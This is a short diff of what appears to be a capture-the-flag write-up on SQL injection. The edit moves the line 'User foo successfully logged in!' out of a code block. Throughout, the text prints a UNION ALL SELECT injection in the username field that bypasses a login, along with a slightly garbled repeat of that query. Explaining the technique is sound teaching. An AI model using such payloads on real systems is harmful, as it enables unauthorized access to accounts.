@@ -35,8 +35,10 @@ It's obvious where the injection is. Let's register a user foo:bar and start cra
 ```
 Easy, isn't it? Go on.
 ```
-	username=bar' UNION ALL SELECT 'foo', 'bar' -- &password=bar	--> User foo successfully logged in!
+	username=bar' UNION ALL SELECT 'foo', 'bar' -- &password=bar	
 ```
+--> User foo successfully logged in!
+
 The query:
 ```
 	username=bar' username=bar' UNION ALL SELECT 'ispo', 'bar'-- &password=bar 
